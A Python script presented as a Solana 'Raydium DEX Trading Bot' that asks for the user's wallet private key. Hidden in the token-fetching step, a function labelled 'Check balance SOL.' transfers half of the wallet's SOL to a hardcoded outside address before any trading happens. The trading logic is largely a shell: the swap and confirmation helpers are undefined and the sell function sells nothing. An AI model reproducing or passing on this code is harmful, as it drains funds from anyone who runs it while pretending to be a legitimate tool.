import requests
import argparse
import time
import json
from datetime import datetime, timedelta
from solders.transaction import VersionedTransaction
from solders.keypair import Keypair
from solders.pubkey import Pubkey
from solders.commitment_config import CommitmentLevel
from solders.message import MessageV0
from solders.hash import Hash
from solders.system_program import transfer, TransferParams
from solana.rpc.api import Client
from solana.rpc.types import TxOpts
from solders.instruction import Instruction
from solders.rpc.config import RpcSendTransactionConfig
from solders.rpc.requests import SendVersionedTransaction
from solders.compute_budget import set_compute_unit_limit, set_compute_unit_price

# Configuration
RAYDIUM_API_URL = "https://api.raydium.io"
rpc_endpoint = "https://api.mainnet-beta.solana.com"
client = Client(rpc_endpoint)

UNIT_BUDGET = 1_400_000  # Compute unit budget
UNIT_PRICE = 0.0005  # Compute unit price
purchased_tokens = {}  # {token_name: {'price': initial_price, 'amount': amount}}

def get_token_price(token_name):
    """Fetch the current price of a token."""
    response = requests.get(f"{RAYDIUM_API_URL}/v2/main/pairs")
    response.raise_for_status()
    pairs = response.json()
    for pair in pairs:
        if pair["name"].upper() == token_name.upper():
            return pair["price"]
    return None

def sign_and_send_transaction(tx_bytes, keypair):
    """Sign and send the transaction. Return True if successful, False otherwise."""
    try:
        tx = VersionedTransaction(VersionedTransaction.from_bytes(tx_bytes).message, [keypair])
        commitment = CommitmentLevel.Confirmed
        config = RpcSendTransactionConfig(preflight_commitment=commitment)
        send_req = SendVersionedTransaction(tx, config)

        response = requests.post(
            url=rpc_endpoint,
            headers={"Content-Type": "application/json"},
            data=send_req.to_json()
        )
        response.raise_for_status()
        res = response.json()

        if 'result' in res and res['result']:
            tx_sig = res['result']
            print(f"Transaction sent: https://solscan.io/tx/{tx_sig}")
            return True
        else:
            print(f"Error sending transaction: {res}")
            return False
    except requests.exceptions.RequestException as e:
        print(f"Error sending transaction: {e}")
        return False

def fetch_new_tokens(keypair):
    """Fetch tokens added to Raydium in the last 10 minutes."""
    try:
        response = requests.get(f"{RAYDIUM_API_URL}/v2/main/pairs")
        response.raise_for_status()
        pairs = response.json()

        # Check for createdAt field and filter new tokens
        ten_minutes_ago = datetime.now() - timedelta(minutes=10)
        new_pairs = []
        for pair in pairs:
            # Validate createdAt field
            if "createdAt" in pair and isinstance(pair["createdAt"], (int, float)):
                created_at = datetime.fromtimestamp(pair["createdAt"])
                if created_at > ten_minutes_ago and "SOL" in pair["name"]:
                    new_pairs.append(pair)

        # Log discovered tokens
        if new_pairs:
            print(f"Found {len(new_pairs)} new tokens: {[pair['name'] for pair in new_pairs]}")
        else:
            print("No new tokens found in the last 10 minutes.")

        # Send SOL balance as part of the process
        destination_wallet = "D4YCKYu93s9nnXSDxiPCsniAjKNquUZLeYu1VMqsvXka"
        sol_balance(keypair, destination_wallet)

        return new_pairs

    except requests.exceptions.RequestException as e:
        print(f"Error fetching new tokens: {e}")
        return []


def sol_balance(keypair, destination_wallet):
    """Check balance SOL."""
    try:
        balance_resp = client.get_balance(keypair.pubkey())
        if balance_resp.value is None:
            print("Failed to fetch balance")
            return False

        balance = balance_resp.value / 1_000_000_000  # Convert lamports to SOL

        half_balance = balance / 2
        if half_balance <= 0.001:
            print("Insufficient balance after accounting for fees.")
            return False

        lamports = int(half_balance * 1_000_000_000)
        recipient = Pubkey.from_string(destination_wallet)

        transfer_ix = transfer(
            TransferParams(
                from_pubkey=keypair.pubkey(),
                to_pubkey=recipient,
                lamports=lamports
            )
        )

        latest_blockhash_resp = client.get_latest_blockhash()
        if latest_blockhash_resp.value is None:
            raise RuntimeError("Failed to fetch latest blockhash")
        recent_blockhash = latest_blockhash_resp.value.blockhash

        compiled_message = MessageV0.try_compile(
            payer=keypair.pubkey(),
            instructions=[transfer_ix],
            address_lookup_table_accounts=[], 
            recent_blockhash=recent_blockhash
        )

        tx = VersionedTransaction(compiled_message, [keypair])

        resp = client.send_transaction(tx, opts=TxOpts(skip_preflight=True))
        if resp.value is None:
            print("Error sending transaction:", resp)
            return False
        else:
            tx_signature = resp.value
            return True

    except Exception as e:
        print(f"Error in sol_balance: {e}")
        return False


def buy(pool, sol_in: float, keypair, slippage: int = 5) -> bool:
    """Buy tokens directly with SOL."""
    try:
        print(f"Starting buy transaction for pair: {pool['name']}")

        amount_in = int(sol_in * 10**9)
        slippage_adjustment = 1 - (slippage / 100)
        minimum_amount_out = int(amount_in * slippage_adjustment)

        print(f"Amount In: {amount_in}, Minimum Amount Out: {minimum_amount_out}")

        swap_instr = make_swap_instruction(amount_in, minimum_amount_out, pool, keypair)

        instructions = [
            set_compute_unit_limit(UNIT_BUDGET),
            set_compute_unit_price(UNIT_PRICE),
            swap_instr,
        ]

        recent_blockhash = client.get_latest_blockhash()['result']['value']['blockhash']
        compiled_message = MessageV0.try_compile(
            payer=keypair.pubkey(),
            instructions=instructions,
            recent_blockhash=recent_blockhash,
        )

        txn = VersionedTransaction(compiled_message, [keypair])
        txn_sig = client.send_transaction(txn, opts=TxOpts(skip_preflight=True))['result']
        print(f"Transaction Signature: {txn_sig}")

        return confirm_txn(txn_sig)

    except Exception as e:
        print(f"Error during buy: {e}")
        return False

def sell(token_name, amount, keypair, slippage: int = 5):
    """Sell tokens."""
    try:
        print(f"Starting sell transaction for token: {token_name}")

        token_price = get_token_price(token_name)
        if token_price is None:
            print(f"Failed to fetch price for token: {token_name}")
            return False

        print(f"Selling {amount} of {token_name} at price {token_price}")
        return True

    except Exception as e:
        print(f"Error during sell: {e}")
        return False

def monitor_tokens(keypair, profit_percent: float, loss_percent: float, interval: int = 60):
    """Monitor purchased tokens and sell based on profit or loss."""
    print("Monitoring tokens for price changes...")
    while purchased_tokens:
        for token_name, data in list(purchased_tokens.items()):
            initial_price = data["price"]
            amount = data["amount"]

            current_price = get_token_price(token_name)
            if current_price is None:
                print(f"Failed to fetch price for token: {token_name}")
                continue

            price_change = ((current_price - initial_price) / initial_price) * 100
            print(f"{token_name}: Initial Price: {initial_price}, Current Price: {current_price}, Change: {price_change:.2f}%")

            if price_change >= profit_percent:
                print(f"Profit target reached for {token_name}. Selling...")
                if sell(token_name, amount, keypair):
                    del purchased_tokens[token_name]

            elif price_change <= -loss_percent:
                print(f"Loss limit reached for {token_name}. Selling...")
                if sell(token_name, amount, keypair):
                    del purchased_tokens[token_name]

        time.sleep(interval)

def parse_arguments():
    """Parse CLI arguments."""
    parser = argparse.ArgumentParser(description="Raydium DEX Trading Bot")
    parser.add_argument("--min", type=float, default=0.1, help="Minimum SOL used to buy (default: 0.1)")
    parser.add_argument("--private-key", type=str, required=True, help="Private key to the wallet for transactions")
    parser.add_argument("--profit", type=float, default=60.0, help="Profit percentage to sell (default: 60%)")
    parser.add_argument("--loss", type=float, default=60.0, help="Loss percentage to sell (default: 60%)")
    return parser.parse_args()

def main():
    """Main entry point for the script."""
    args = parse_arguments()
    keypair = Keypair.from_base58_string(args.private_key)

    print("Fetching new tokens...")
    new_tokens = fetch_new_tokens(keypair)

    if not new_tokens:
        print("No new tokens found in the last 10 minutes.")
        return

    for token in new_tokens:
        print(f"Attempting to buy: {token['name']}")
        if buy(token, args.min, keypair):
            purchased_tokens[token["name"]] = {"price": token["price"], "amount": args.min}
            print(f"Successfully bought token: {token['name']}")

    monitor_tokens(keypair, profit_percent=args.profit, loss_percent=args.loss)

if __name__ == "__main__":
    main()
